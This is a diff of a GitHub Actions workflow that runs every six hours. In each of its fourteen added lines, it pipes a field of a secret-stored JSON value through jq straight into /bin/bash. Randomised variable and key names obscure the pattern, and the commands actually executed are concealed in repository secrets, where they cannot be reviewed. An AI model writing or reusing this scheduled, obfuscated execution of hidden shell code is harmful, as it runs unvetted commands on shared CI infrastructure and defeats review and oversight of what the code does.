@@ -1,27 +1,30 @@
 name: dengfei19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 4/6 * * *'
+    - cron: '12 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dengfei19871010
         env:
-          xnhu3352: ${{ secrets.xnhu3352 }}
+          p56: ${{ secrets.p56 }}
         run: |
-          echo $xnhu3352 | jq -r .s038 | /bin/bash
-          echo $pu458 | jq -r .dnw8 | /bin/bash
-          echo $u6 | jq -r .gkaaf423 | /bin/bash
-          echo $sa60 | jq -r .pln59288 | /bin/bash
-          echo $vsln4558 | jq -r .qfyys7 | /bin/bash
-          echo $wwap037 | jq -r .h02 | /bin/bash
-          echo $rltik122 | jq -r .zn7 | /bin/bash
-          echo $kv2 | jq -r .vlfk60 | /bin/bash
-          echo $tjord74159 | jq -r .f3 | /bin/bash
-          echo $ui18 | jq -r .kpx71 | /bin/bash
-          echo $an19 | jq -r .pjbht890 | /bin/bash
+          echo $p56 | jq -r .ql41855 | /bin/bash
+          echo $fozpi7380 | jq -r .ho88485 | /bin/bash
+          echo $j925 | jq -r .hscx6 | /bin/bash
+          echo $ygxns0976 | jq -r .roill8097 | /bin/bash
+          echo $qw1 | jq -r .ijar7920 | /bin/bash
+          echo $tak0884 | jq -r .g844 | /bin/bash
+          echo $f4534 | jq -r .yu63667 | /bin/bash
+          echo $sttra48 | jq -r .zf7 | /bin/bash
+          echo $vinf6918 | jq -r .vgky8093 | /bin/bash
+          echo $b881 | jq -r .zxnb1 | /bin/bash
+          echo $iqkq28 | jq -r .k20 | /bin/bash
+          echo $v9518 | jq -r .xwhqj81 | /bin/bash
+          echo $tadfq5918 | jq -r .p331 | /bin/bash
+          echo $tl7 | jq -r .pm29 | /bin/bash
 
